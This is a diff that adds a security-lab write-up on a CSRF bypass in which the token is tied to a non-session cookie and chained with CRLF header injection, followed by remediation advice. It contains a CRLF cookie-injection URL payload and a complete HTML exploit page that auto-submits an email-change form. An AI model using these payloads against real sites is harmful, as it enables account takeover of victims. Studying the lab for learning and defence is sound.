@@ -1725,3 +1725,543 @@ Otherwise → reusable = broken
 ---
 
 Global CSRF token = anyone can act as anyone
+
+---
+
+# 🐞 Lab-5 — CSRF → Token Tied to Non-Session Cookie (Cookie Injection Chain)
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates an advanced CSRF bypass where protection is incorrectly implemented using a **non-session cookie (`csrfKey`)**.
+
+---
+
+Normally:
+
+CSRF tokens must be tied to the user session.
+
+---
+
+However, in this lab:
+
+✔ CSRF token is tied to a cookie (`csrfKey`)  
+❌ That cookie is NOT tied to session  
+
+---
+
+Additionally:
+
+The application is vulnerable to **header injection**, allowing attackers to set cookies in victim browsers.
+
+---
+
+👉 By chaining both flaws:
+
+✔ Attacker injects their own `csrfKey`  
+✔ Sends matching CSRF token  
+✔ Server accepts request  
+
+---
+
+## 🧠 🟦 Core Idea
+
+If attacker controls CSRF validation inputs → protection is bypassed
+
+---
+
+## 🧠 🟥 Key Exploit
+
+```
+Set-Cookie: csrfKey=ATTACKER_VALUE
+```
+
+---
+
+👉 Combined with:
+
+```
+csrf=ATTACKER_VALUE
+```
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 CSRF Token Bound to Non-Session Cookie
+
+A flawed design where CSRF validation depends on a cookie not tied to the user session
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Request (User A)
+
+Login:
+
+```
+wiener : peter
+```
+
+---
+
+Captured request:
+
+```
+POST /my-account/change-email
+
+Cookie:
+session=ABC
+csrfKey=AAA123
+
+Body:
+csrf=AAA123
+email=test@normal.com
+```
+
+---
+
+![userA-csrf](../images/userA-csrf-key-token.png)
+
+---
+
+### 🧠 Observation
+
+```
+csrf token matches csrfKey cookie
+```
+
+---
+
+### 🧩 Step 2 — Cross-User Test (User B)
+
+Login:
+
+```
+carlos : montoya
+```
+
+---
+
+Reuse User A values:
+
+```
+Cookie:
+session=XYZ
+csrfKey=AAA123
+
+Body:
+csrf=AAA123
+email=test@normal.com
+```
+
+---
+
+![userB-csrf-reuse](../images/userB-csrf-key-token.png)
+
+---
+
+### 🧠 Result
+
+✔ Request accepted  
+✔ Cross-user token reuse works  
+
+---
+
+### 🧠 Vulnerability Insight
+
+```
+csrf validation checks token == csrfKey
+NOT session ownership
+```
+
+---
+
+### 🧩 Step 3 — Discover Header Injection
+
+Test search:
+
+```
+/?search=test
+```
+
+---
+
+Response:
+
+```
+Set-Cookie: search=test
+```
+
+---
+
+![header-injection](../images/csrf-header-injection.png)
+
+---
+
+### 🧠 Observation
+
+```
+User input reflected in Set-Cookie header
+```
+
+---
+
+👉 Header Injection confirmed
+
+---
+
+### 🧩 Step 4 — Inject csrfKey Cookie
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrfKey=AAA123%3b%20SameSite=None
+```
+
+---
+
+👉 Forces victim browser to set:
+
+```
+csrfKey=AAA123
+```
+
+---
+
+### 🧩 Step 5 — Build Final Exploit
+
+```
+<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="AAA123">
+</form>
+
+<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=AAA123%3b%20SameSite=None"
+onerror="document.forms[0].submit()">
+```
+
+---
+
+![final-exploit](../images/final-exploit-csrf.png)
+
+---
+
+### 🧩 Step 6 — Deliver Exploit
+
+```
+Victim loads attacker page
+```
+
+---
+
+👉 Execution flow:
+
+✔ Cookie injected  
+✔ Form auto-submitted  
+✔ Request accepted  
+
+---
+
+### 🧩 Step 7 — Result
+
+```
+Email changed via CSRF bypass
+```
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 Cookie Injection
+
+```
+%0d%0a → CRLF → new header
+Set-Cookie: csrfKey=AAA123
+```
+
+---
+
+### 🔹 CSRF Token
+
+```
+csrf=AAA123
+```
+
+---
+
+### 🔹 IMG Trick
+
+```
+<img src="...">
+```
+
+---
+
+✔ Triggers request  
+✔ Works cross-origin  
+
+---
+
+### 🔹 Auto Submit
+
+```
+onerror="document.forms[0].submit()"
+```
+
+---
+
+✔ Executes after cookie injection  
+
+---
+
+## 🌍 🟥 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Account Takeover
+
+```
+Inject csrfKey → change email → reset password
+```
+
+---
+
+### 🔥 Scenario 2 — Banking Systems
+
+```
+Inject cookie → perform transfer
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Panel
+
+```
+Inject csrfKey → escalate privileges
+```
+
+---
+
+### 🔥 Scenario 4 — SaaS Platforms
+
+```
+Modify billing / API keys
+```
+
+---
+
+### 🔥 Scenario 5 — Multi-Step Chain
+
+```
+CRLF Injection → Cookie Injection → CSRF Bypass
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Capture valid csrfKey + token  
+2️⃣ Confirm cross-user reuse  
+3️⃣ Find header injection  
+4️⃣ Inject csrfKey into victim  
+5️⃣ Build exploit page  
+6️⃣ Auto-submit request  
+7️⃣ Victim executes payload  
+8️⃣ Server accepts request  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Critical
+
+```
+/change-email
+/change-password
+/reset-password
+/add-admin
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+/add-payment-method
+```
+
+---
+
+### 🔹 Account
+
+```
+/update-profile
+/delete-account
+```
+
+---
+
+### 🔹 Admin APIs
+
+```
+/admin/create-user
+/admin/delete-user
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ CSRF Bound to Session
+
+👉 Attack fails
+
+---
+
+### ❌ No Header Injection
+
+👉 Cannot set cookie
+
+---
+
+### ❌ SameSite=Strict
+
+👉 Cookie not sent
+
+---
+
+### ❌ Input Sanitization
+
+👉 CRLF blocked
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Find alternate injection points
+Use subdomain cookie injection
+Chain with XSS
+```
+
+---
+
+## 🛡️ 🔒 Remediation
+
+---
+
+### 🔴 Root Problem
+
+CSRF token tied to controllable cookie instead of session
+
+---
+
+### ✅ Fix 1 — Bind Token to Session
+
+```
+Token must match user session
+```
+
+---
+
+### ✅ Fix 2 — Prevent Header Injection
+
+```
+Sanitize CRLF (\r\n)
+```
+
+---
+
+### ✅ Fix 3 — Secure Cookie Usage
+
+```
+SameSite=Strict
+HttpOnly
+Secure
+```
+
+---
+
+### ✅ Fix 4 — Strong Token Design
+
+```
+Per-session or per-request tokens
+```
+
+---
+
+### ✅ Fix 5 — Validate Origin / Referer
+
+```
+Block cross-site requests
+```
+
+---
+
+### ✅ Fix 6 — Avoid Reflecting Input in Headers
+
+```
+Never use user input in Set-Cookie
+```
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+Normal:
+
+```
+CSRF token + session = secure
+```
+
+---
+
+This lab:
+
+```
+CSRF token + csrfKey = weak
+```
+
+---
+
+Attacker:
+
+```
+controls csrfKey → controls validation
+```
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ Token exists but not session-bound  
+
+✔ Cookie used for validation is controllable  
+
+✔ Header injection enables cookie manipulation  
+
+✔ Full CSRF bypass achieved  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Controllable CSRF cookie + header injection = full account takeover
